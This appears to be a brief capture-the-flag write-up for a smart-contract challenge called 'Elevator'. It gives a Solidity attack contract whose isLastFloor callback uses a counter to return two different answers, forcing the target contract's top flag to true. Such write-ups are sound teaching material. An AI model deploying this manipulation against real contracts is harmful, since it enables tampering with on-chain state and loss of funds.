# Elevator

---
Objective: 
- This elevator won't let you reach the top of your building. Right?
- Reach the top of the building
---

Notes:

Set top to true
Is a bool

Needs first to be true, so false after the `isLastFloor`
Just needs to feed it

```solidity
contract Hack {
  uint private count;
  Elevator private immutable target;

  constructor(address _target) {
    target = Elevator(_target);
  }

  function pwn() external {
    target.goTo(2);
    require(target.top(), "not top");
  }

  function isLastFloor(uint) external returns (bool) {
    count++;
    return count > 1;
  }
}
```

We use a counter to return two different booleans